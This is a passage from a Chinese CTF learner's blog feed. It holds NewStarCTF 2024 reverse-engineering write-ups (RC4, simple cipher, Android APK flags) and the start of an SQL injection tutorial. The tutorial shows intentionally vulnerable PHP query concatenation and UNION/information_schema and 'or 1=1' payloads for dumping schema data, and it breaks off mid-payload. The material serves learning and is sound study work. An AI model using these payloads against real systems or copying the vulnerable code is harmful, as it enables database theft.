class="hljs-built_in">exit</span>(status);<br>    &#125;<br>  &#125;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;this is right~&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>输入的字符串长度为 <code>22</code>，然后进入 <code>RC4</code> 函数加密，后续进行 <code>for</code> 循环中，把<code>s</code> 和 <code>data</code> 进行比较</p><p>RC4 函数内容：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">RC4</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *a1, __int64 a2)</span><br>&#123;<br>  __int64 result; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">unsigned</span> __int8 v3; <span class="hljs-comment">// [rsp+14h] [rbp-Ch]</span><br>  <span class="hljs-type">unsigned</span> __int8 v4; <span class="hljs-comment">// [rsp+15h] [rbp-Bh]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v6; <span class="hljs-comment">// [rsp+1Ch] [rbp-4h]</span><br><br>  v3 = <span class="hljs-number">0</span>;<br>  v4 = <span class="hljs-number">0</span>;<br>  init_sbox(a2);<br>  v6 = <span class="hljs-built_in">strlen</span>(a1);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; ; ++i )<br>  &#123;<br>    result = i;<br>    <span class="hljs-keyword">if</span> ( i &gt;= v6 )<br>      <span class="hljs-keyword">break</span>;<br>    v4 += sbox[++v3];<br>    swap(&amp;sbox[v3], &amp;sbox[v4]);<br>    a1[i] ^= sbox[(<span class="hljs-type">unsigned</span> __int8)(sbox[v3] + sbox[v4])];<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>RC4 加密，好讨厌写解密算法。。。</p><p>看 wp 可以进行动调，又学到了，直接下断点</p><p><img src="https://img.dkdun.cn/v1/2024/12/0ed96784483aba17.png"></p><p>这是 <code>elf</code> 文件，所以只能远程动调，连接 kali</p><p><img src="https://img.dkdun.cn/v1/2024/12/30ea914294d8ad9b.png"></p><p>随便输入字符串，断点断在了加密函数，查看数据就是我们输入的字符串</p><p>然后找到 <code>data</code> ，把数据提取出来</p><p><img src="https://img.dkdun.cn/v1/2024/12/0b7d89f3556bbcf9.png"></p><p><img src="https://img.dkdun.cn/v1/2024/12/4b329403b9e95b5f.png"></p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">from ida_bytes import *<br>addr = <span class="hljs-number">0x55FE34CF0040</span>//s的起始地址<br>enc = [<span class="hljs-number">0xC4</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0xAF</span>, <span class="hljs-number">0xB9</span>, <span class="hljs-number">0xE3</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0x9B</span>, <span class="hljs-number">0xF5</span>, <span class="hljs-number">0x10</span>,<br>       <span class="hljs-number">0x56</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0x9C</span>,<br>       <span class="hljs-number">0x75</span>, <span class="hljs-number">0xB5</span>]<br>for i <span class="hljs-keyword">in</span> range(<span class="hljs-number">22</span>):<br>    patch_byte(addr + i, enc[i])<br>print(<span class="hljs-string">&#x27;Done&#x27;</span>)<br></code></pre></td></tr></table></figure><p>点进 <code>run</code> 之后，s 就会有变化，然后 f9 运行又会断在与 <code>data</code> 比较的地方，这个时候可以看 <code>s</code> 的值，与之前又不一样，按 <code>a</code> 可以转化为字符串（又学到了！）</p><p><img src="https://img.dkdun.cn/v1/2024/12/ced081c112845bbe.png"> </p><p>over~</p>]]></content>
    
    
    <categories>
      
      <category>只关于 Reverse</category>
      
      <category>赛题复现</category>
      
      <category>NewStarCTF 2024</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NewStarCTF 2024 Week1</title>
    <link href="/2024/11/11/%E5%A4%8D%E7%8E%B01/"/>
    <url>/2024/11/11/%E5%A4%8D%E7%8E%B01/</url>
    
    <content type="html"><![CDATA[<p>复现复现！猫猫虫真可爱捏 :)</p><span id="more"></span><h1 id="Simple-encryption"><a href="#Simple-encryption" class="headerlink" title="Simple_encryption"></a>Simple_encryption</h1><p>ida 打开</p><p><img src="https://img.dkdun.cn/v1/2024/12/45aba7af131703c1.png"></p><p>主要逻辑是根据输入的字符串长度，如果<code>j%3==0</code> ，那么就将输入的索引为<code>j</code> 的值减去 <code>31</code>，如果 <code>j%3==1</code>，加上<code>41</code>,如果 <code>j%3==2</code>，那么和 <code>0x55</code> 异或。然后值与 <code>buffer</code> 数组相比较，一样就成功，所以点进数组提取数据。</p><p><img src="https://img.dkdun.cn/v1/2024/12/71cd4fc66d472b65.png"></p><p>可以写出 python 脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">buffer = [<span class="hljs-number">0x47</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0xA4</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x16</span>,<br>          <span class="hljs-number">0x88</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0xA2</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x5C</span>,<br>          <span class="hljs-number">0x07</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x8E</span>, <span class="hljs-number">0x28</span>,<br>          <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(buffer)):<br>    <span class="hljs-keyword">if</span> i % <span class="hljs-number">3</span> == <span class="hljs-number">0</span>:<br>        buffer[i] += <span class="hljs-number">0x1f</span><br>    <span class="hljs-keyword">if</span> i % <span class="hljs-number">3</span> == <span class="hljs-number">1</span>:<br>        buffer[i] -= <span class="hljs-number">0x29</span><br>    <span class="hljs-keyword">if</span> i % <span class="hljs-number">3</span> == <span class="hljs-number">2</span>:<br>        buffer[i] ^= <span class="hljs-number">0x55</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(buffer[i]), end=<span class="hljs-string">&#x27;&#x27;</span>)<br></code></pre></td></tr></table></figure><h1 id="ezAndroidStudy"><a href="#ezAndroidStudy" class="headerlink" title="ezAndroidStudy"></a>ezAndroidStudy</h1><p>我记得之前在哪个师傅博客看到过说先看 <code>.xml</code> 文件的 <code>activity</code> 可以快速找到。</p><p>对于 apk 文件可以先拖进模拟器运行看看里面是什么样的，然后看看提示</p><p><img src="https://img.dkdun.cn/v1/2024/12/1225907047cea4d6.png"></p><p>所以查看 <code>AndroidManifest.xml</code>，看见 <code>activity</code> 只有 <code>work.pangbai.ezandroidstudy.Homo</code> 和 <code>work.pangbai.ezandroidstudy.MainActivity</code></p><p><img src="https://img.dkdun.cn/v1/2024/12/8cdfab6774a6a8c5.png"></p><p>拿到 flag1</p><p><img src="https://img.dkdun.cn/v1/2024/12/51ac9c9e7e71f1e9.png"></p><p>看下一个</p><p><img src="https://img.dkdun.cn/v1/2024/12/f1ca7ebb6f9da41c.png"></p><p>在 <code>resources.arsc/res/value/string.xml</code> 找到了</p><p><img src="https://img.dkdun.cn/v1/2024/12/cdf9036f6f299c85.png"></p><p>继续看下一个</p><p><img src="https://img.dkdun.cn/v1/2024/12/fd4cd1392593c483.png"></p><p><code>/layout/activity_main.xml</code> 里的 <code>activity_main.xml</code></p><p><img src="https://img.dkdun.cn/v1/2024/12/8fb3d0ba6b81c630.png"></p><p>查找 flag4</p><p><img src="https://img.dkdun.cn/v1/2024/12/fd86d0f76ba83a70.png"></p><p>打开 <code>/res/raw</code> 发现目录下有个 <code>flag4.txt</code></p><p><img src="https://img.dkdun.cn/v1/2024/12/bbfa8ee63b0b9c03.png"></p><p>flag 5</p><p><img src="https://img.dkdun.cn/v1/2024/12/6f609d03f4d2cc66.png"></p><p>需要逆向 so 层，那么将 <code>.so</code> 提取出来，可以使用<code>apktool</code></p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">apktool</span> d ezAndroidStudy.apk -o <span class="hljs-string">&quot;需要生成的文件夹&quot;</span><br></code></pre></td></tr></table></figure><p> 将<code>&quot;/lib/x86_64/libezandroidstudy.so&quot;</code>丢进 ida 反编译就出来了</p><p><img src="https://img.dkdun.cn/v1/2024/12/94ea73f36dd81624.png"></p><h1 id="ez-debug"><a href="#ez-debug" class="headerlink" title="ez_debug"></a>ez_debug</h1><p>根据题目丢进 <code>x64dbg</code> 动调</p><p>首先查找字符串，看看有没有可以字符串，可以发现有一些 <code>flag</code> 字样</p><p><img src="https://img.dkdun.cn/v1/2024/12/c4ab9716a8f2bb1b.png"></p><p>在 <code>Decrypted flag</code> 处下个断点运行，得到结果</p><p><img src="https://img.dkdun.cn/v1/2024/12/be3f66141d6c7ac6.png"></p><p><img src="https://img.dkdun.cn/v1/2024/12/42e30da474972b02.png"></p><p>太喜欢逆向了有种做不出来但又想做的崩溃感</p>]]></content>
    
    
    <categories>
      
      <category>只关于 Reverse</category>
      
      <category>赛题复现</category>
      
      <category>NewStarCTF 2024</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQL注入</title>
    <link href="/2024/11/10/SQL%E6%B3%A8%E5%85%A5/"/>
    <url>/2024/11/10/SQL%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<p>以前一直搞不太懂 SQL 注入的一些东西，不知道为什么要加单引号或双引号，为什么有时候用 and 但有时候又用 or，最近看了一些 SQL 注入知识点，所以总结一些 qwq</p><span id="more"></span><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>寻找功能点进行测试，达到非预期执行数据库语句</p><p>比如</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">select</span> username,password from <span class="hljs-built_in">users</span> <span class="hljs-built_in">where</span> <span class="hljs-built_in">id</span> = butt3rf1y;<br></code></pre></td></tr></table></figure><p>一般在以下地方容易存在注入点：</p><p>URL参数：例如在查询字符串或路径中</p><p>表单输入：应用程序中的表单输入框，如用户名、密码、搜索框等，如果没有进行充分的输入验证和过滤，就可能成为 SQL 注入的目标</p><p>Cookie：如果应用程序使用 Cookie 来存储用户信息或会话状态，可以通过修改 Cookie 中的值来进行 SQL 注入</p><p>HTTP头部：有些应用程序可能会从 HTTP 头部中获取数据，可以在 HTTP 头部中进行 SQL 注入</p><p>数据库查询语句：如果有源码，直接进行代码审计，可能有直接拼接 SQL 查询语句的地方，存在 SQL 注入</p><h2 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h2><p><img src="/2024/11/06/TestWP/QLschema.png"></p><p>如上图，数据库的结构为</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs livescript">+数据库 <span class="hljs-function"><span class="hljs-params">(database)</span>--&gt;</span>ctf_database<br>+ - 表_user <span class="hljs-function"><span class="hljs-params">(table_user)</span>--&gt;</span>user<br>+ - 表_users <span class="hljs-function"><span class="hljs-params">(table_users)</span>--&gt;</span>users<br>+ + - 列_id <span class="hljs-function"><span class="hljs-params">(column_id)</span>--&gt;</span>id<br>+ + - 列_username <span class="hljs-function"><span class="hljs-params">(column_username)</span>--&gt;</span>username<br>+ + - 列_password <span class="hljs-function"><span class="hljs-params">(column_password)</span>--&gt;</span>password<br>+ + + - 数据<br>+ + + - 数据<br></code></pre></td></tr></table></figure><h2 id="常用语法"><a href="#常用语法" class="headerlink" title="常用语法"></a>常用语法</h2><p><code>SECLECT</code></p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-keyword">select</span> 列名<span class="hljs-number">1</span>, 列名<span class="hljs-number">2</span>, ... <span class="hljs-keyword">from</span> 表名 <span class="hljs-keyword">where</span> 条件<br></code></pre></td></tr></table></figure><p><code>UNION</code></p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> 列名<span class="hljs-number">1</span> <span class="hljs-keyword">from</span> 表名<span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> 列名<span class="hljs-number">2</span> <span class="hljs-keyword">from</span> 表名<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>使用 <code>union</code> 的时候两个表列数必须相同</p><p><code>Order by</code></p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-keyword">select</span> column1, column2, ... <span class="hljs-keyword">from</span> table_name [<span class="hljs-keyword">where</span> condition] <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> column_name<br></code></pre></td></tr></table></figure><p>一般用来判断列数，比如说</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs s">select column1，column2 from table_name order by 1;//不报错<br>select column1，column2 from table_name order by 2;//不报错<br>select column1，column2 from table_name order by 3;//报错<br>//说明只有2列<br></code></pre></td></tr></table></figure><h3 id="常用参数"><a href="#常用参数" class="headerlink" title="常用参数"></a>常用参数</h3><p><code>user()</code>：当前数据库用户</p><p><code>database()</code>：当前数据库名</p><p><code>concat()</code>：联合数据，用于联合两条数据。比如 <code>concat(username,0x30,password)</code> 将 <code>username</code> 和 <code>password</code> 通过 <code>:</code> 连接起来</p><p><code>group_concat</code>：和 <code>concat</code> 类似，用于把多条数据一次注入出来</p><p><code>select xxoo into outfile &#39;路径&#39;</code>：权限较高时可直接写文件</p><h1 id="基本注入类型"><a href="#基本注入类型" class="headerlink" title="基本注入类型"></a>基本注入类型</h1><h2 id="注入类型判断"><a href="#注入类型判断" class="headerlink" title="注入类型判断"></a>注入类型判断</h2><p>SQL 处理语句后台的写法</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">select</span> username,password from <span class="hljs-built_in">users</span> <span class="hljs-built_in">where</span> <span class="hljs-built_in">id</span> = ?<br></code></pre></td></tr></table></figure><p><code>?</code> 这里有多种闭合方式，比如:<code>$id</code>，<code>&#39;$id&#39;</code>，<code>“$id”</code>，<code>($id)</code></p><p>然后<strong>构造闭合</strong>，其实这个词我也不太懂，看了一下探姬师傅的 hello-ctf 上的解释，是这样的：</p><p>比如后台为：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">select</span> username,password from <span class="hljs-built_in">users</span> <span class="hljs-built_in">where</span> <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;<span class="hljs-variable">$id</span>&quot;</span><br></code></pre></td></tr></table></figure><p>那么我们使传入的 <code>$id=&#39;1&quot;&#39;</code> ，后台执行则为</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">select</span> username,password from <span class="hljs-built_in">users</span> <span class="hljs-built_in">where</span> <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;1&quot;</span><span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure><p>在这里对 <code>1</code> 完成了闭合构造，但是闭合了前序导致后续的 <code>&quot;</code> 没有双引号配对，多出来的这个双引号就会导致报错：</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">1064 </span>- You have an <span class="hljs-keyword">error</span> in your SQL syntax; check the manual that corresponds <span class="hljs-keyword">to</span> your MySQL server version <span class="hljs-keyword">for</span> the right syntax <span class="hljs-keyword">to</span> use near <span class="hljs-comment">&#x27;&quot;&#x27; at line 1</span><br></code></pre></td></tr></table></figure><p>所以通常在构造完闭合后去注释掉后面的符号，比如使用 <code>#</code>,<code>--</code></p><h3 id="是否报错判断"><a href="#是否报错判断" class="headerlink" title="是否报错判断"></a>是否报错判断</h3><p><code>&quot;1&#39;&quot;</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">select</span> username,password from <span class="hljs-built_in">users</span> <span class="hljs-built_in">where</span> <span class="hljs-built_in">id</span> = <span class="hljs-string">&quot;1&#x27;&quot;</span><br>// <span class="hljs-string">&quot;&quot;</span> 中为可以包含 <span class="hljs-string">&#x27;,而 1&#x27;</span>是一个合法字符串，在查询时会先被强制类型转换为数字，不会报错<br></code></pre></td></tr></table></figure><p><code>1&#39;</code></p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> uders <span class="hljs-keyword">where</span> id = <span class="hljs-number">1</span><span class="hljs-string">&#x27;</span><br><span class="hljs-string">// 因为这里的&#x27;</span>没有闭合，会报错<br></code></pre></td></tr></table></figure><p><code>&#39;1&#39;&#39;</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">select</span> username,password from <span class="hljs-built_in">users</span> <span class="hljs-built_in">where</span> <span class="hljs-built_in">id</span> = <span class="hljs-string">&#x27;1&#x27;</span><span class="hljs-string">&#x27;</span><br><span class="hljs-string">// &#x27;</span>与前面的<span class="hljs-string">&#x27;闭合了,但是剩了一个 &#x27;</span>，会报错<br></code></pre></td></tr></table></figure><h3 id="报错信息判断"><a href="#报错信息判断" class="headerlink" title="报错信息判断"></a>报错信息判断</h3><p><code>1&quot;</code></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim">执行：id = <span class="hljs-string">&quot;1&quot;</span><span class="hljs-comment">&quot;</span><br>报错：near <span class="hljs-string">&#x27;&quot;1&quot;&quot;&#x27;</span> at <span class="hljs-built_in">line</span> <span class="hljs-number">1</span><br>//去掉外层 SQL 的单引号，留下 <span class="hljs-string">&quot;1&quot;</span><span class="hljs-comment">&quot;,可以判断出是双引号的字符型注入</span><br></code></pre></td></tr></table></figure><p><img src="/2024/11/06/TestWP/QL1.png"></p><p><code>1&#39;</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">执行：<span class="hljs-built_in">id</span> = <span class="hljs-string">&#x27;1&#x27;</span><span class="hljs-string">&#x27;</span><br><span class="hljs-string">报错：near &#x27;</span>1<span class="hljs-string">&#x27;&#x27;</span><span class="hljs-string">&#x27; at line 1</span><br><span class="hljs-string">// 去掉外层留下 &#x27;</span>1<span class="hljs-string">&#x27;&#x27;</span>,再除去注入的 1<span class="hljs-string">&#x27;,可以判断出是单引号的字符型注入</span><br></code></pre></td></tr></table></figure><p><img src="/2024/11/06/TestWP/QL2.png"></p><p><code>&#39;1</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">执行：<span class="hljs-built_in">id</span> = <span class="hljs-string">&#x27;&#x27;</span>1<span class="hljs-string">&#x27;</span><br><span class="hljs-string">报错：near &#x27;</span><span class="hljs-string">&#x27;1&#x27;</span> at line 1<br>// 对于 SQL,<span class="hljs-built_in">id</span> = <span class="hljs-string">&#x27;&#x27;</span>已经闭合，所以 1<span class="hljs-string">&#x27; 成为了报错点</span><br></code></pre></td></tr></table></figure><p><img src="/2024/11/06/TestWP/QL3.png"></p><h2 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$conn</span> = <span class="hljs-title function_ invoke__">mysqli_connect</span>(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-string">&#x27;root&#x27;</span>,<span class="hljs-string">&#x27;root&#x27;</span>,<span class="hljs-string">&#x27;test&#x27;</span>);<br><span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$conn</span>,<span class="hljs-string">&quot;select username from users where id=&quot;</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]);<br><span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysqli_fetch_array</span>(<span class="hljs-variable">$res</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;username&#x27;</span>]);<br></code></pre></td></tr></table></figure><p>根据用户输入 id，查询用户信息。用户的输入 id 字段，没有任何过滤地被直接拼接在了 sql 查询语句中。由于 id 没有被引用包裹，而且类型为数字，此为数字型注入。</p><p>可以使用在语句中加入运算符来测试这种注入是否存在</p><p>sql 关键字 <strong>union</strong>，将两个 select 语句结果合并到一个结果集中，但要求两个 select 语句拥有相同的列数。</p><p>使用联合查询 <code>union</code> 基于 <code>information_schema</code> 拿到数据库名</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id = <span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-built_in">schema_name</span> <span class="hljs-keyword">from</span> information_schema.schemata;<br></code></pre></td></tr></table></figure><p><img src="/2024/11/06/TestWP/QL4.png"></p><p>以把 1 换成其他的，比如 <code>database()</code></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id = <span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>(),<span class="hljs-built_in">schema_name</span> <span class="hljs-keyword">from</span> information_schema.schemata;<br></code></pre></td></tr></table></figure><p><img src="/2024/11/06/TestWP/QL5.png"></p><p><strong>空格的 url 编码是 %20</strong>，如果要查询其他行，还需要使用 **limit **关键字。</p><p>使用联合查询去得到数据库的表名，先获取当前库（<code>database()</code>）</p><p>基于 <code>UNION</code> <code>GROUP_CONCAT(table_name)</code> 和 <code>information_schema.tables</code> 查询</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id = <span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">table_name</span>),<span class="hljs-number">2</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema = <span class="hljs-keyword">database</span>();<br></code></pre></td></tr></table></figure><p><img src="/2024/11/06/TestWP/QL6.png"></p><p>获取 表 的对应字段名</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id = <span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">column_name</span>),<span class="hljs-number">2</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> table_schema = <span class="hljs-keyword">database</span>();<br></code></pre></td></tr></table></figure><p><img src="/2024/11/06/TestWP/QL7.png"></p><h2 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$conn</span> = <span class="hljs-title function_ invoke__">mysqli_connect</span>(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-string">&#x27;root&#x27;</span>,<span class="hljs-string">&#x27;root&#x27;</span>,<span class="hljs-string">&#x27;test&#x27;</span>);<br><span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$conn</span>,<span class="hljs-string">&quot;select id from users where username=&#x27;&quot;</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>].<span class="hljs-string">&quot;&#x27;&quot;</span>);<br><span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysqli_fetch_array</span>(<span class="hljs-variable">$res</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;id&#x27;</span>]);<br></code></pre></td></tr></table></figure><p>通过 username 查询 id，而且用户输入的 username 被单引号包裹起来了。所有用户的所有输入都会被当成字符串处理，无法将之前的数字型注入的 payload 进行注入了。如果输入中有一个引号，就可以将前面的引号闭合，使得后面的内容从字符串中逃逸出来。最后将后面的引号注释掉。</p><p><strong>首先就需要构造单引号的闭合</strong></p><p>使用一个单引号将字符串闭合，在输入 sql 语句，最后用 # 号将后面的单引号注释掉。</p><p>比如：<strong>username &#x3D; ‘or 1&#x3D;1 #</strong>,</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">select id <span class="hljs-keyword">from</span><span class="hljs-built_in"> users </span>where <span class="hljs-attribute">username</span>=<span class="hljs-string">&#x27;&#x27;</span>or <span class="hljs-attribute">1</span>=1 #;<br></code></pre></td></tr></table></figure><p>在 where 语句中，or 连接两个表达式，第一个返回假第二个返回真，or 操作后返回真，整个操作返回所有的结果集。</p><p><code>username=-1’ or ‘1’=‘1’ --</code></p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> username = <span class="hljs-string">&#x27;-1&#x27;</span> <span class="hljs-keyword">or</span> <span 